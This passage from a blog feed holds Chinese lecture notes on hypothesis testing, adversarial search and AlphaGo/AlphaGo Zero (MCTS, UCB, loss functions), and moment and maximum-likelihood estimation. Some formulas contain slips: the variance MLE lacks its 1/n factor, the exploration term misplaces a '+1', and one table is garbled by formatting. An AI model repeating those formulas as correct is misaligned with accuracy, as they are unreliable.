$H_0$ 有时也称观测值是显著的.</li></ul><h3 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h3><ul><li><p>统计学中没有绝对的证实或证伪.</p><script type="math/tex; mode=display">  \alpha(R):=P_{\theta}((X_1,\cdots,X_n)\in R\mid H_0).\\  \beta(R):=P_{\theta}((X_1,\cdots,X_n)\in R^c\mid H_1).</script></li><li><p>检验程序的属性, 不是样本的属性. 样本做决策要么正确要么错误.</p><script type="math/tex; mode=display">  \alpha(R)\le\alpha.\\  \beta(R)\le\beta.</script><p>  预先指定的可接受的长期错误率.</p></li></ul><h3 id="显著性检验-v-s-Neyman-Pearson-检验"><a href="#显著性检验-v-s-Neyman-Pearson-检验" class="headerlink" title="显著性检验 v.s. Neyman-Pearson 检验"></a>显著性检验 v.s. Neyman-Pearson 检验</h3><ul><li><p>显著性检验: 只控制 $\alpha(R)\le\alpha$.</p></li><li><p><strong>Neyman-Pearson</strong> 假设检验: 强调两类错误、功效, $H_0,H_1$ 地位不均等.</p></li><li><p>不拒绝 $H_0$ $\ne$ 接受 $H_0$.</p></li><li><p>$\beta(R)$ 越小 (功效越大), 当 $H_0$ 不真时, 越有可能拒绝 $H_0$; 当观测支持 $H_0$, 则可以接受 $H_0$.</p></li><li><p>若忽略了对 $\beta(R)$ 的系统控制 (常见情形), 将导致对结果及下一步工作方向的误判.</p></li><li><p><strong>例</strong>  $H_0:\mu\ge 5$, $H_1:\mu&lt;5$. $n=10$, $\sigma=0.01$, $\alpha=0.01$.</p></li><li><p><strong>解答</strong>  临界值</p><script type="math/tex; mode=display">  c=\mu_0-Z_{\alpha}\dfrac{\sigma}{\sqrt{n}}\approx 4.993.</script></li></ul><h3 id="P-值"><a href="#P-值" class="headerlink" title="P 值"></a>P 值</h3><ul><li>一次具体的观测值没有概率可言, <strong>P</strong> 不能衡量决策错误的概率. (<strong>ASA</strong> 文章)</li></ul><h3 id="卡方检验-——-多项分布的检验"><a href="#卡方检验-——-多项分布的检验" class="headerlink" title="卡方检验 —— 多项分布的检验"></a>卡方检验 —— 多项分布的检验</h3><ul><li><strong>例</strong>  $H_0: p_1=p$, $p_2=1-p$. 此时<script type="math/tex; mode=display">  \begin{aligned}  \chi^2&=\dfrac{(O_1-np_1)^2}{np_1}+\dfrac{(O_2-np_2)^2}{np_2}\\  &=\dfrac{(O_1-np)^2}{np}+\dfrac{(O_1-np)^2}{n(1-p)}\\  &=\dfrac{(O_1-np)^2}{np(1-p)}\\  &\stackrel{近似}{\sim} N^2(0,1)=\chi^2(1).  \end{aligned}</script></li></ul><h3 id="统计显著-ne-实际显著"><a href="#统计显著-ne-实际显著" class="headerlink" title="统计显著 $\ne$ 实际显著"></a>统计显著 $\ne$ 实际显著</h3><ul><li><p><strong>例</strong>  投掷骰子 $n=6\times 10^{10}$ 次​.</p><p>  | 点数               | 1         | 2                  | 3                 | 4                | 5                 | 6                  | 总计              |<br>  | ————————— | ————- | ————————— | ————————- | ———————— | ————————- | ————————— | ————————- |<br>  | 观测频数 $10^{10}$ | $-10^{6}$ | $1.5\times 10^{6}$ | $-2\times 10^{6}$ | $4\times 10^{6}$ | $-3\times 10^{6}$ | $0.5\times 10^{6}$ | $6\times 10^{10}$ |</p><p>  $H_0:$ 分布均匀, $H_1:$ 分布不均匀. </p></li><li><p>计算得到 $\chi^2=3250$, 此时 <strong>P</strong> 值 $\ll 0.0001$. 因此拒绝 $H_0$, 统计显著. </p></li><li><p>实际上 $\vert\hat p_i-\dfrac{1}{6}\vert\sim 10^{-4}$, 实际角度视为无差异, 实际不显著.</p></li><li><p>$n$ 过大, 明察秋毫; $\chi^2$ 统计量关于 $n$ 是非齐次的.</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> Probability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Probability &amp; Statistics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人工智能导论 笔记3</title>
      <link href="/2023/05/12/ren-gong-zhi-neng-dao-lun-bi-ji-3/"/>
      <url>/2023/05/12/ren-gong-zhi-neng-dao-lun-bi-ji-3/</url>
      
        <content type="html"><![CDATA[<h1 id="第三章-对抗搜索"><a href="#第三章-对抗搜索" class="headerlink" title="第三章 对抗搜索"></a>第三章 对抗搜索</h1><h2 id="博弈问题"><a href="#博弈问题" class="headerlink" title="博弈问题"></a>博弈问题</h2><ul><li>一人一步、信息完备、零和博弈.</li><li>通常<strong>不具有穷举性</strong> (棋类问题).</li></ul><h2 id="极小-极大模型"><a href="#极小-极大模型" class="headerlink" title="极小-极大模型"></a>极小-极大模型</h2><ul><li><p>目标: <strong>对方不犯错</strong>的情况下<strong>结局对自己有利</strong> (有利节点的数值&gt;0).</p></li><li><p>圆形为<strong>极小节点</strong>, 正方形为<strong>极大节点</strong>, 自己应该始终沿着极大值行进.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302007961.png" alt=""></p></li><li><p>模仿人类下棋思考过程, 但<strong>有限深度内的穷举</strong>不可行.</p></li><li><p>为解决模型存在的问题, 只在<strong>少数可能的走步范围内</strong>考虑.</p></li></ul><h2 id="alpha-beta-减枝算法"><a href="#alpha-beta-减枝算法" class="headerlink" title="$\alpha$-$\beta$ 减枝算法"></a>$\alpha$-$\beta$ 减枝算法</h2><ul><li><p>极大节点的下界为 $\alpha$, 极小节点的上界为 $\beta$, 使用 <strong>DFS</strong> 生成节点.</p></li><li><p>剪枝条件:</p><ul><li><strong>后辈节点的 $\beta$ 值 ≤ 祖先节点的 $\alpha$ 值时, $\alpha$ 剪枝.</strong></li><li><strong>后辈节点的 $\alpha$ 值 ≥ 祖先节点的 $\beta$ 值时, $\beta$ 剪枝.</strong></li></ul></li><li><p>简记:</p><ul><li><strong>极小 ≤ 极大, 剪枝.</strong></li><li><p><strong>极大 ≥ 极小, 剪枝.</strong></p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302007962.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302007963.png" alt=""></p></li></ul></li><li><p>注意:</p><ul><li>估值需要总结专家知识.</li><li><strong>比较</strong>大小需要<strong>所有祖先节点</strong>进行比较.</li><li>先决定是否<strong>剪枝</strong>, 再决定是否<strong>上传</strong>.</li><li>$\alpha$-$\beta$ 减枝仅能<strong>决定接下来一步的最优选择</strong>.</li><li>对局面评估的准确性要求高.</li></ul></li></ul><h2 id="Monte-Carlo-方法"><a href="#Monte-Carlo-方法" class="headerlink" title="Monte Carlo 方法"></a>Monte Carlo 方法</h2><ul><li><p>从所有可落子点<strong>随机选择</strong>, 重复直到胜负可判断, <strong>多次模拟</strong>选择<strong>胜率最大</strong>的点.</p></li><li><p><strong>(MCTS)</strong> <strong>蒙特卡洛树搜索</strong>:</p><ul><li><p>将可能出现的状态转移过程用<strong>状态树</strong>表示.</p></li><li><p>从初始状态开始重复抽样, 逐步扩展.</p></li><li><p>树中的节点<strong>父节点可以利用子节点的模拟结果</strong>，提高了效率.</p></li><li><p>在搜索过程中可以<strong>随时得到行为的评价</strong>.</p></li><li><p>选择策略:</p><ul><li>对具有较大希望节点的<strong>利用</strong>.</li><li><p>对尚未充分了解节点的<strong>探索</strong>.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302007964.png" alt=""></p></li></ul></li></ul></li><li><p><strong>(UCB)</strong> <strong>信心上限算法</strong>:</p>  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> UCB1<span class="token punctuation">:</span><span class="token keyword">for</span> each j <span class="token keyword">in</span> 拉杆<span class="token punctuation">:</span>访问 j 并记录收益<span class="token keyword">while</span> 尚未达到访问次数限制<span class="token punctuation">:</span>计算每个拉杆的 UCB1 信心上界 Ij访问信心上界最大的拉杆<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script type="math/tex; mode=display">  I_j=\overline{X}_j+c\sqrt{\dfrac{2\ln n}{T_j(n)}}.</script><ul><li><p>$\overline{X}_j$ 是拉杆 $j$ 所获得<strong>回报的均值</strong>.</p></li><li><p>$n$ 是到当前这一时刻为止所访问的总次数.</p></li><li><p>$T_j(n)$ 是拉杆 $j$ 到目前为止所<strong>访问的次数</strong>.</p></li><li><p>上式考虑了 <strong>“利用” 和 “探索” 间的平衡</strong>.</p></li></ul></li><li><p><strong>(UCT)</strong> <strong>信心上限树算法</strong>:</p>  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">UctSearch</span><span class="token punctuation">(</span>s0<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token triple-quoted-string string">'''  TREEPOLICY:  节点还可扩展--扩展并模拟节点不可扩展--从子节点选择一个并循环  '''</span>以状态s0创建根节点v0<span class="token punctuation">;</span>    <span class="token keyword">while</span> 尚未用完计算时长<span class="token punctuation">:</span>      vl <span class="token operator">=</span> TreePolicy<span class="token punctuation">(</span>v0<span class="token punctuation">)</span><span class="token punctuation">;</span>      △ <span class="token operator">=</span> DefaultPolicy<span class="token punctuation">(</span>s<span class="token punctuation">(</span>vl<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      Backup<span class="token punctuation">(</span>vl，△<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">(</span>BestChild<span class="token punctuation">(</span>v0，<span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>每个节点记录: <strong>获胜</strong>次数 / <strong>模拟</strong>总次数.</p></li><li><p><strong>获胜次数相对于本节点角度</strong>, <strong>方便进行选择.</strong></p></li><li><p>假设 $c=0$, 此时 $I_j=\overline{X}_j$.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302007965.png" alt=""></p></li></ul></li></ul><h2 id="AlphaGo-原理"><a href="#AlphaGo-原理" class="headerlink" title="AlphaGo 原理"></a>AlphaGo 原理</h2><ul><li><p><strong>MCTS</strong> 存在的问题:</p><ul><li>生成<strong>所有子节点</strong>.</li><li>模拟具有<strong>盲目性</strong>.</li></ul></li><li><p><strong>AlphaGo</strong> 中神经网络与 <strong>MCTS</strong> 结合:</p><ul><li>缩小了搜索<strong>范围</strong>.</li><li><p>提高了模拟<strong>水平</strong>.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302007966.png" alt=""></p></li><li><p><strong>策略网络</strong>:</p><ul><li><p>输入: 当前棋局 —— <strong>48</strong> 个通道, 每个通道大小为 <strong>19*19</strong>.</p></li><li><p>输出: 棋盘上每个点的<strong>行棋概率</strong> —— 概率越大, 行棋点越好.</p></li><li><p>训练数据: <strong>16</strong> 万盘人类棋手的数据.</p></li><li><p><strong>分类问题</strong>: 任意一个棋局分类为 <strong>361</strong> 类之一, 行棋点为标记.</p></li><li><p><strong>损失函数</strong>:</p><script type="math/tex; mode=display">  L(w)=-t_a\log p_a.</script><p>  其中 $t_a$ 为当前棋局下棋手落子在 $a$ 处时为 1, 否则为 0; $p_a$ 为策略网络在 $a$ 处落子的概率.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302007967.png" alt=""></p></li></ul></li><li><p>估值网络: 由一个神经网络构成.</p><ul><li><p>输入: 当前棋局 —— <strong>49</strong> 个通道, 每个通道大小为 <strong>19*19</strong>.</p></li><li><p>输出: 当前棋局的<strong>收益</strong> —— 收益的取值范围为 $[-1, 1]$.</p></li><li><p>训练数据: <strong>16</strong> 万盘人类棋手的数据.</p></li><li><p><strong>回归问题</strong>: 获胜时收益为 $1$, 失败时收益为 $-1$.</p></li><li><p><strong>损失函数</strong>:</p><script type="math/tex; mode=display">  L(w)=(R-V(s))^2.</script><p>  其中 $R$ 为棋局的胜负, 胜为 1, 负为 -1; $V(s)$ 为估值网络的输出, 即预测的收益.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302008757.png" alt=""></p></li></ul></li><li><p><strong>MCTS</strong> 中的选择原则:</p><ul><li><strong>利用</strong>: 收益好的节点.</li><li><p><strong>探索</strong>: 模拟次数少的节点.</p></li><li><p><strong>经验</strong>: <strong>落子概率高</strong>的节点 (<strong>AlphaGo</strong> 增加的第三个原则).</p></li></ul></li><li><p>节点 $s$ 第 $i$ 次<strong>模拟的收益</strong>:</p><script type="math/tex; mode=display">  v_i(s)=\lambda value(s)+(1-\lambda)rollout(s).</script><p>  其中 $value(s)$ 是估值网络的输出, $rollout(s)$ 是一次模拟结果.</p></li><li><p><strong>平均收益</strong>:</p><script type="math/tex; mode=display">  Q(s_a)=\dfrac{1}{n}\sum\limits_{i=1}^{n}v_i(s_a).</script><p>  其中 $s(a)$ 为 $s$ 棋局下在 $a$ 处落子后的棋局.</p></li><li><p><strong>探索项</strong>:</p><script type="math/tex; mode=display">   u(s_a)=c\cdot p(s_a)\dfrac{\sqrt{N(s)}}{N(s_a+1)}.</script><p>  其中 $N(\cdot)$ 为模拟次数, $p(s_a)$ 为策略网络在 $a$ 处下棋概率, $c$ 为加权系数.</p></li></ul></li><li><p><strong>AlphaGo</strong> 中的 <strong>MCTS</strong> 过程:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302008758.png" alt=""></p><ul><li>用 $Q(s_a)+u(s_a)$ 代替信心上限 $I_j$, 优先选择 $Q(s_a)+u(s_a)$ 大的子节点.</li><li>遇到叶节点 $s_l$ 结束, 该节点被选中.</li><li>生成 $s_l$ 的<strong>所有子节点</strong>, 但是<strong>不进行模拟</strong>.</li><li><p>规定了<strong>最大节点深度</strong>.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302008759.png" alt=""></p></li><li><p>对 $s_l$ 进行模拟, 计算:</p><script type="math/tex; mode=display">  v_i(s)=\lambda value(s)+(1-\lambda)rollout(s).</script></li><li><p><strong>模拟</strong>过程采用<strong>推演策略网络</strong>, 其速度快, 是策略网络的 $1000$ 倍.</p></li><li><p>规定了<strong>总模拟次数</strong>.</p></li></ul></li></ul><h2 id="围棋中的深度强化学习方法"><a href="#围棋中的深度强化学习方法" class="headerlink" title="围棋中的深度强化学习方法"></a>围棋中的深度强化学习方法</h2><ul><li><p>强化学习:</p><ul><li>学习 “做什么才能使得<strong>收益最大化</strong>” 的方法.</li><li>学习者不会被告知如何做, 必须自己通过尝试发现哪些动作会产生最大的收益.</li><li><strong>监督学习</strong>使用<strong>策略网络</strong>、<strong>无需尝试</strong>.</li><li>两个特征: <strong>试错</strong>和<strong>延迟收益</strong>.</li></ul></li><li><p>深度强化学习:</p><ul><li>用<strong>深度学习 (神经网络) 方法</strong>实现的强化学习.</li></ul></li><li><p>关键问题: 如何获得<strong>指示信号</strong>?</p><ul><li>监督学习: <strong>情景与标注一一对应</strong>.</li><li>强化学习:<ul><li><strong>将收益转化为 “标注”</strong>.</li><li>不能获得所有情况下既正确又有代表性的示例.</li></ul></li></ul></li><li><p>手段:</p><ul><li>将<strong>深度强化学习问题</strong>转化为<strong>神经网络训练问题</strong>.</li><li>不同的转换方法构成了不同的深度强化学习方法.</li><li>关键是<strong>损失函数的定义</strong>.</li></ul></li><li><p>围棋中深度强化学习的三种实现方法:</p><ul><li><p>基于<strong>策略梯度</strong>的强化学习:</p><ul><li><p>数据: $(s,a,p_a,t_a)$ (棋局、行棋、获胜概率、延迟胜负值).</p><p>  $t_a$ 为胜负值, 胜为 1, 负为 -1.</p></li><li><p>损失函数: $L(w)=-t_a\log⁡(p_a)$.</p><ul><li>假设获胜者的行为都是正确的, 负者行为都是不正确的.</li><li>假设获负时对权重的修改量大小与获胜时一样, 方向相反.</li></ul><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302008760.png" alt=""></p></li><li><p><strong>AlphaGo</strong>: <strong>先监督学习, 再强化学习.</strong></p></li><li>注意点:<ul><li>强化学习过程中, 每个<strong>样本只使用一次</strong>;</li><li>基于策略梯度的<strong>强化学习</strong>学到了在每个可落子点行棋的<strong>获胜概率</strong>; <strong>监督学习</strong>学到了在某个可落子点的<strong>行棋概率</strong>.</li></ul></li></ul></li><li><p>基于<strong>价值评估</strong>的强化学习:</p><ul><li><p>输入: 当前棋局和行棋点.</p></li><li><p>输出: 取值在 -1、1 之间的估值.</p></li><li><p>数据: $(s,a,V(s,a),R)$ (棋局、行棋、网络输出、延迟胜负值).</p><p>  $R$ 为胜负值, 胜为 1, 负为 -1.</p></li><li><p>损失函数: $L(w)=(E-V(s,a))^2$.</p></li><li><p><strong>基于价值评估的强化学习</strong>学到了每个落子点<strong>获取最大收益的概率</strong>.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302008761.png" alt=""></p></li></ul></li><li><p>基于<strong>演员-评价方法</strong>的强化学习:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302008762.png" alt=""></p><ul><li><p>收益增量:</p><ul><li><p>评价一步棋的好坏</p><script type="math/tex; mode=display">  A=Q(s,a)-V(s).</script></li><li><p>$V(s)$ 为棋局 $s$ 的<strong>预期收益</strong>, 取值范围为 $[-1, 1]$.</p></li><li><p>$Q(s,a)$ 为在 $a$ 处<strong>行棋后的收益</strong>, 取值范围为 $[-1, 1]$.</p></li><li><p>$A$ 为<strong>收益增量</strong>, 取值范围为 $[-2, 2]$.</p></li><li><p>$A$ 越大越说明走了一步妙招, 越小越说明走了一步败招.</p></li></ul></li><li><p>收益增量的计算:</p><script type="math/tex; mode=display">  A=R-V(s).</script><p>  其中 $R$ 为胜负值, 胜为 $1$, 负为 $-1$.</p></li><li><p>损失函数:</p><ul><li>评价部分: $L_1(w)=(R-V(s))^2$.</li><li>演员部分: $L_2(w)=-\vert A\vert t_a\log(p_a)=-A\log(p_a)$.</li><li>综合损失函数: $L(w)=L_1(w)+\lambda L_2(w)$.</li></ul></li><li><p><strong>基于演员-评价方法的强化学习</strong>强调<strong>重要行棋点的学习</strong>, 学到了每个落子点获取<strong>最大收益增量的概率</strong>.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302008764.png" alt=""></p></li></ul></li></ul></li></ul><h2 id="AlphaGo-Zero-原理"><a href="#AlphaGo-Zero-原理" class="headerlink" title="AlphaGo Zero 原理"></a>AlphaGo Zero 原理</h2><ul><li><p>从零学习:</p><ul><li>不再使用人类棋手的数据.</li><li>不再使用人工特征作为输入 (自动抽取).</li><li>利用<strong>强化学习从零学习</strong>.</li></ul></li><li><p><strong>AlphaGo Zero</strong> 的网络结构:</p><ul><li><p>将<strong>策略网络、估值网络</strong>合并为一个 <strong>“双输出” 网络</strong>.</p></li><li><p>输入: <strong>17</strong> 个通道, 每个通道大小为 <strong>19*19</strong>.</p></li><li><p>策略网络输出: <strong>19×19+1</strong>, <strong>多了一个 “放弃” 行为.</strong></p></li><li><p>估值网络输出: 当前棋局的<strong>估值</strong>, 取值范围为 $[-1, 1]$.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302008765.png" alt=""></p></li></ul></li><li><p><strong>AlphaGo Zero</strong> 中的 <strong>MCTS</strong>:</p><ul><li><p>节点 $s$ 第 $i$ 次<strong>模拟的收益</strong> (<strong>AlphaGo</strong> $\Rightarrow$ <strong>AlphaGo Zero</strong>):</p><script type="math/tex; mode=display">  v_i(s)=\lambda value(s)+(1-\lambda)rollout(s)\Rightarrow v_i(s)=value(s).</script><p>  其中 $value(s)$ 是<strong>估值网络</strong>的输出.</p></li><li><p><strong>平均收益</strong>:</p><script type="math/tex; mode=display">  Q(s_a)=\dfrac{1}{n}\sum\limits_{i=1}^{n}v_i(s_a).</script><p>  其中 $s(a)$ 为 $s$ 棋局下在 $a$ 处落子后的棋局.</p></li><li><p><strong>探索项</strong>:</p><script type="math/tex; mode=display">   u(s_a)=c\cdot p(s_a)\dfrac{\sqrt{N(s)}}{N(s_a+1)}.</script><p>  其中 $N(\cdot)$ 为模拟次数, $p(s_a)$ 为<strong>策略网络</strong>在 $a$ 处下棋概率, $c$ 为加权系数.</p></li></ul></li><li><p><strong>AlphaGo Zero</strong> 中的 <strong>MCTS</strong> 过程:</p><ul><li><p><strong>选择</strong>:</p><ul><li><p>用 $Q(s_a)+u(s_a)$ 代替信心上限 $I_j$, 选择 $Q(s_a)+u(s_a)$ 大的子节点;</p></li><li><p>遇到叶节点 $s_l$ 结束, 该节点被选中.</p></li></ul></li><li><p><strong>生成</strong>:</p><ul><li><p>生成 $s_l$ 的所有子节点, 但是<strong>不进行模拟</strong>;</p></li><li><p>规定了<strong>最大节点深度</strong>.</p></li></ul></li><li><p><strong>模拟回传</strong>:</p><ul><li><p>用<strong>估值网络</strong>输出<strong>取代</strong>快速<strong>模拟</strong>过程, 对 $s_l$ 进行模拟, 计算:</p><script type="math/tex; mode=display">  v_i(s)=value(s).</script></li><li><p>规定了<strong>总模拟次数</strong>.</p></li></ul></li></ul></li><li><p><strong>损失函数</strong>:</p><ul><li><p><strong>估值网络</strong>部分:</p><script type="math/tex; mode=display">  L_1=(z-v)^2.</script><p>  其中 $v$ 是估值网络的输出, $z$ 是胜负值.</p></li><li><p><strong>策略网络</strong>部分:</p><script type="math/tex; mode=display">  L_2=-\sum_{i=1}^{362}\pi_i\log(p_i).</script><p>  其中 $\pi(i)$ 是 <strong>MCTS</strong> 输出的每个落子点的概率 (与每个点被选中次数有关), $p_i$ 是策略网络输出的每个落子点的概率.</p></li><li><p><strong>综合损失函数</strong>:</p><script type="math/tex; mode=display">  L=L_1+L_2+\Vert\theta\Vert_2^2.</script><p>  其中 $\Vert\theta\Vert_2^2$ <strong>防止出现过拟合</strong>.</p></li></ul></li><li><p>引入<strong>多样性</strong>: </p><ul><li><p>防止走向错误的方向, 对策略网络的输出人为引入噪声.</p></li><li><p><strong>狄利克雷分布</strong>:</p><ul><li>通过参数可以产生一些<strong>符合一定条件的概率分布</strong>.</li><li>控制参数 $n$ 概率分布向量的长度与 $\alpha$ 分布浓度.</li></ul></li><li><p>落子概率:</p><script type="math/tex; mode=display">  p=\lambda p_a+(1-\lambda)p_d.</script><p>  其中 $p_a$ 为<strong>策略网络输出</strong>, $p_d$ 为<strong>狄利克雷分布采样</strong>.</p></li><li><p>引入噪声不会引起 “不良反应”, <strong>MCTS</strong> 具有 <strong>“纠错” 能力</strong>.</p></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> IAI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Introduction to AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论与数理统计 笔记6</title>
      <link href="/2023/05/07/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-6/"/>
      <url>/2023/05/07/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-6/</url>
      
        <content type="html"><![CDATA[<h1 id="Chap-6-参数估计"><a href="#Chap-6-参数估计" class="headerlink" title="Chap 6 参数估计"></a>Chap 6 参数估计</h1><ul><li><p><strong>引入</strong>  检测某厂一大批电子元件寿命指标是否合格.</p></li><li><p><strong>总体</strong></p><ul><li>所需检测的电子元件寿命;</li><li>统计分析问题中研究的对象全体的某个数字特征 $X$.</li><li>元件寿命的分布;</li><li>变量 $X$ 的分布.</li></ul></li><li><p><strong>统计总体</strong>  一个概率分布.</p></li><li><p><strong>注</strong></p><ul><li>有限总体;</li><li>无限总体.</li></ul></li><li><p><strong>统计模型</strong></p><ul><li>一族概率分布;</li><li>参数模型 (正态模型);</li><li>非参数模型.</li></ul></li><li><p><strong>样本</strong></p><ul><li>$(X_1,\cdots,X_n)$, 其中 $X_i$ 来自总体 $X$, $n$ 为样本容量;</li><li>获取方式:<ul><li>试验;</li><li>观察 (完全 / 不完全).</li></ul></li></ul></li><li><p><strong>简单随机抽样</strong></p><ul><li>总体个数 $N$ 有限;</li><li>无放回;</li><li>容量为 $n$ 的样本抽取出来的概率为 $p=\dfrac{1}{C_N^n}$.</li></ul></li><li><p><strong>随机样本</strong></p><ul><li>$X_1,\cdots,X_n$ 独立同分布, 例: 有放回 / 近似有放回 ($n&lt;&lt;N$).</li></ul></li><li><p><strong>统计量</strong></p><ul><li><p>$T(X_1,\cdots,X_n)$ - 完全由样本决定, 是一种数据简化方式.</p></li><li><p>样本均值</p><script type="math/tex; mode=display">  \overline{X}=\dfrac{1}{n}\sum_{i=1}^{n}X_i.</script></li><li><p>样本方差 </p><script type="math/tex; mode=display">  S^2=\dfrac{1}{n-1}\sum_{i=1}^{n}(X_i-\overline{X})^2.</script></li></ul></li><li><p><strong>统计推断</strong></p><ul><li>总体为因, 样本为果;</li><li>总体决定样本, 样本推断总体;</li><li>经典方法 (频率) v.s. <strong>Bayes</strong>方法.</li><li><strong>例</strong>  $Y_i=aX_i+\varepsilon_i$.<ul><li>求 $a$. $(X_i,Y_i)(1\le i\le n)\rightarrow a\approx\hat{a}$ (模型推断 参数估计)</li><li>已知 $a=\hat{a}$, 观测到 $Y_i$, 求 $X_i$ (变量推断)</li></ul></li><li><strong>例</strong>  元件寿命.<ul><li>假设 $X\sim Exp(\lambda)$, 求 $\lambda$ (参数估计)</li><li>假设合格标准 $E(X)\ge L$, 需建立可操作的检验标准: $X\ge l$, $\mu$ 未知, 求 $l$ (假设检验)</li></ul></li></ul></li></ul><h2 id="矩估计"><a href="#矩估计" class="headerlink" title="矩估计"></a>矩估计</h2><ul><li><p><strong>定义(样本矩)</strong>  $X_1,\cdots,X_n$ 独立同分布, 定义其 $k$ 阶<strong>原点矩</strong>:</p><script type="math/tex; mode=display">  a_k=\dfrac{1}{n}\sum_{i=1}^{n}X_i^k\stackrel{\textbf{LLN}}{\longrightarrow}E(X^k).</script><p>  其 $k$ 阶<strong>中心矩</strong>:</p><script type="math/tex; mode=display">  m_k=\dfrac{1}{n}\sum_{i=1}^{n}(X_i-\overline{X})^k\stackrel{\textbf{LLN}}{\longrightarrow}E\Big[(X-\mu)^k\Big].</script></li><li><p><strong>例</strong>  $X\sim N(\mu,\sigma^2)$. 考虑其均值、方差对应的样本矩.</p></li><li><p><strong>解答</strong></p><script type="math/tex; mode=display">  \mu=E(X)\approx\overline{X}=a_1;\\  \sigma^2=E\Big[(X-\mu)^2\Big]\approx\dfrac{1}{n}\sum_{i=1}^{n}(X_i-\overline{X})^2=m_2.</script></li><li><p><strong>例</strong>  $X\sim Exp(\lambda)$. 考虑其均值、方差对应的样本矩, 并给出 $\lambda$ 的矩估计.</p></li><li><p><strong>解答</strong></p><script type="math/tex; mode=display">  \dfrac{1}{\lambda}=E(X)\approx\overline{X}=a_1\Rightarrow\lambda=\dfrac{1}{a_1};\\  \dfrac{1}{\lambda^2}=E\Big[(X-E(X))^2\Big]\approx\dfrac{1}{n}\sum_{i=1}^{n}(X_i-\overline{X})^2=m_2\Rightarrow\lambda=\Big(\dfrac{1}{m_2}\Big)^{\tfrac{1}{2}}.</script><p>  我们通常使用<strong>低阶矩</strong>进行估计.</p></li></ul><h2 id="极大似然估计-MLE"><a href="#极大似然估计-MLE" class="headerlink" title="极大似然估计 (MLE)"></a>极大似然估计 (MLE)</h2><ul><li><p><strong>定义(似然函数)</strong>  假设 $X_1,\cdots,X_n$ 的联合分布 $f(x_1,\cdots,x_n;\theta)$ (<strong>PMF\\PDF</strong>), 其中 $\theta$ 为参数. 对于观测 $(X_1,\cdots,X_n)$ 的似然函数为</p><script type="math/tex; mode=display">  L(\theta):=f(X_1,\cdots,X_n;\theta).</script></li><li><p><strong>注</strong></p><ul><li><p>具体观测数据通常记为 $(x_1,\cdots,x_n)$, 视为 $(X_1,\cdots,X_n)$ 的具体的实现值;</p></li><li><p>离散情形下, $L(\theta)$ 为出现 $(X_1,\cdots,X_n)$ 的概率;</p></li><li><p>若 $X_1,\cdots,X_n$ 独立同分布, 总体分布为 $f_1(x;\theta)$ (<strong>PMF\\PDF</strong>), 那么</p><script type="math/tex; mode=display">  L(\theta)=f_1(X_1;\theta)f_1(X_2;\theta)\cdots f_1(X_n;\theta).</script></li></ul></li><li><p><strong>例</strong>  $X_i\sim N(\mu,\sigma^2)$ 独立同分布, 其中 $\mu$,$\sigma^2$ 未知. 考虑观测的似然函数.</p></li><li><p><strong>解答</strong></p><script type="math/tex; mode=display">  L(\mu,\sigma^2)=\prod_{i=1}^{n}\Big(\dfrac{1}{\sqrt{2\pi}\sigma}e^{-\tfrac{(X_i-\mu)^2}{2\sigma^2}}\Big).</script></li><li><p><strong>定义(MLE)</strong>  定义 $\theta$ 的 <strong>MLE</strong> 为</p><script type="math/tex; mode=display">  \theta^{*}=\arg\max_{\theta}L(\theta).</script><p>  其中 $\theta^{<em>}=\theta^{</em>}(X_1,\cdots,X_n)$.</p></li><li><p><strong>解答续</strong>  考虑方程组</p><script type="math/tex; mode=display">  \begin{cases}  \dfrac{\partial\log L(\mu,\sigma^2)}{\partial\mu}=0;\\  \dfrac{\partial\log L(\mu,\sigma^2)}{\partial\sigma^2}=0.  \end{cases}</script><p>  解得</p><script type="math/tex; mode=display">  \begin{cases}  \mu^{*}=\overline{X},\\  (\sigma^2)^{*}=\sum\limits_{i=1}^{n}(X_i-\overline{X})^2.  \end{cases}</script><p>  经验证 $(\mu^{<em>},(\sigma^2)^{</em>})$ 为 $(\mu,\sigma^2)$ 的 <strong>MLE</strong>.</p></li><li><p><strong>注</strong>  $(\sigma^2)^{<em>}=(\sigma^{</em>})^2$ 